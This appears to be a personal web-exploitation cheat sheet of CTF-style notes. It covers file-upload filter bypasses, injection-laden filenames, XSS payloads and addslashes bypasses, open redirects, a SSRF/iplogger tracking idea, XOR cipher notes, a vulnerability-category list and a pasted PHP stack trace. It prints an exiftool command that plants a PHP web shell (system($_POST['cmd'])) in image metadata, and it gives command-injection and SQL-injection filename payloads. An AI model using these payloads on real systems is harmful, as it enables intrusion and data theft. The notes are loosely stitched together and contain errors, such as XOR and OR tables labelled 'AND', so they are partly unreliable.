            		-Adding null bytes and other special chars  to the filename to achieve blocked extensions 0x00 or %0d,%0a,%00,\x00
            		-Mixing the filename to upper and lowercase
            		-Check whether the backend is replacing chars which can be exploited using “file.php”  > “file.p.phphp”
            		-Try to replace existing files by including existing filenames or  paths in the file name like ../favicon.ico
            		-Check other variations of the extension you are uploading like php5,php4
            		-if the metadata of the file can be leveraged,change the metadata using
            			exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

            		The maximum length of a filename in linux is 255, however, wget truncate the filenames to 236 characters. You can download a file called "A"*232+".php"+".gif", this filename will bypass the check (as in this example ".gif" is a valid extension) but wget will rename the file to "A"*232+".php".

            		Set filename to ../../../tmp/lol.png and try to achieve a path traversal
					Set filename to sleep(10)-- -.jpg and you may be able to achieve a SQL injection
					Set filename to <svg onload=alert(document.comain)> to achieve a XSS
					Set filename to ; sleep 10; to test some command injection (more command injections tricks here)
					****XSS in image (svg) file upload
					JS file upload + XSS = Service Workers exploitation
					****XXE in svg upload****
					****Open Redirect via uploading svg file
					Famous ImageTrick vulnerability
					If you can indicate the web server to catch an image from a URL you could try to abuse a SSRF. If this image is going to be saved in some public site, you could also indicate a URL from https://iplogger.org/invisible/ and steal information of every visitor.
					XXE and CORS bypass with PDF-Adobe upload
					Specially crafted PDFs to XSS: The following page present how to inject PDF data to obtain JS execution. If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.





    OPEN REDIRECTS IN URL
        http://example.com/dir/
        http://example.com//dir -> Might lead to http://dir since every link starting with // is changed to http:// or https://
    Check every status code .A website might say 404 but the status code is 200n


    CROSS SITE SCRIPTING(XSS)
    TIPS
        Just add pure html first
        Then try closing tags


        Reference
            https://www.joe0.com/2016/12/08/cross-site-scripting-xss-and-exploiting-_serverphp_self/

         $_SERVER[‘PHP_SELF’]) can be leverage to achieve xss in a website

        Consider <form action="test.php" method="post">
        Payload : <form action="  test.php/"><script>alert(1)</script>    " method="post">
        Payload : <form action="  test.php" onload='javascript:alert(1)' onmouseover="javascript:alert(1)   " method="post">


        Medium
            Uses addslashes to fight xss but <script>alert(document.domain)</script>,<img/src=dd onerror=javascript:alert(document.domain)></img> still works
            Bypassing addslashes
                The data just has to include a " and the attribute is broken out of.(Works only when the input is added to an attribute)

        JSON EASY
            var JSONResponseString = '{"movies":[{"response":"  CSS"}]}';alert(document.domain);var trash='{[{"  ??? Sorry, we don&#039;t have that movie :("}]}';

        JSON AJAX
            {"movies":[{"response":"	css"}]};alert(1);let trash={[{" ??? Sorry, we don't have that movie :("}]}

            {"movies":[{"response":"	css"}]};<script>alert(1)</script>;<!--{[{" ??? Sorry, we don't have that movie :("}]}

    echo json_encode($movies); 
	

   
    

                        ----------------------
                              CRYPTOGRAPHY
                        ---------------------

Algorithm (where i is the index)
output_str += chr(ord(inp_string[i]) ^ ord(key[i%len(key)]))
output_str +=currentletterofstring ^ 



# string ^ key =ciphertext
# string ^ ciphertext =key(repeated)
# ciphertext ^ key = string 


def encrypt(string,key):
    result=''
    for index in range(len(string)):
        result+=chr(ord(string[index]) ^ ord(key[index%len(key)]))
    print(result)


https://en.wikipedia.org/wiki/XOR_cipher
XOR(smilar to add in binary)
    0 AND 0 = 0
    0 AND 1 = 1
    1 AND 0 = 1
    1 AND 1 = 0


OR(optimist)
    0 AND 0 = 0
    0 AND 1 = 1
    1 AND 0 = 1
    1 AND 1 = 1



AND(pessimist)
    0 AND 0 = 0
    0 AND 1 = 0
    1 AND 0 = 0
    1 AND 1 = 1




Cross Site Scripting
Information Leakage: Error Disclosure
Unpatched Library
Application Misconfiguration: Global Error Handling Disabled SQL Injection
Application Misconfiguration: Debug
Path Traversal
UI Redressing: Clickjacking/Tapjacking
Missing Access Strategy
Cryptography: Insecure Digest
Denial of Service: ReadLine
Injection: HTTP Response Splitting
Insufficient Session Expiration
Insufficient Transport Layer Protection
URL Redirector Abuse
Unvalidated Automatic Library Activation
Information Leakage: Logging
Information Leakage: Session ID
OS Command Injection
Insufficient Authorization: HTTP Verb Tampering 
Cryptography: Cipher Transformation Insecure 
Information Leakage: SSN
Cryptography: Insecure Cipher
Cryptography: Improper Certificate Validation 
Cryptography: Insecure Protocol
Injection: Remote Code Execution
Insufficient Authentication: Basic Authentication Usage 
Cryptography: Provider Undefined
Binary Protection: Missing PT_DENY_ATTACH
Insecure Data Storage: Unencrypted SSN
Unsafe Code Usage
Cryptography: Insecure Cipher Mode
LDAP Injection
Directory Indexing
Injection: HTTP Request Splitting
Insufficient Authorization: CORS Policy
Sensitive data location precision
Denial of Service: ReadFile
Remote File Inclusion
Access Control: File Permissions




Fatal error: Uncaught Exception: Table 'cxders456_HyRS123.isv_competition_sponsors' doesn't exist query: SELECT id, sponsorname, sponsorlink, sponsorlogo, status, added FROM isv_competition_sponsors WHERE compeid = ? AND status = ? in /home2/cxders456/ctfs/build/database/MysqliDb.php:2013 Stack trace: #0 /home2/cxders456/ctfs/build/database/MysqliDb.php(1601): MysqliDb->_prepareQuery() #1 /home2/cxders456/ctfs/build/database/MysqliDb.php(751): MysqliDb->_buildQuery(NULL) #2 /home2/cxders456/ctfs/build/classes/pages/class.public.php(54): MysqliDb->get('competition_spo...', NULL, Array) #3 /home2/cxders456/ctfs/build/classes/pages/class.public.php(83): public_page->get_sponsors(4, 1) #4 /home2/cxders456/ctfs/build/pages/_autoload.php(7): require_once('/home2/cxders45...') #5 /home2/cxders456/ctfs/build/classes/global/class.app.php(142): require_once('/home2/cxders45...') #6 /home2/cxders456/ctfs/isvipi_load.php(46): app->route('https://ctf.cyb...') #7 /home2/cxders456/ctfs/index.php(24): require('/home2/cxders45...') #8 in /home2/cxders456/ctfs/build/database/MysqliDb.php on line 2013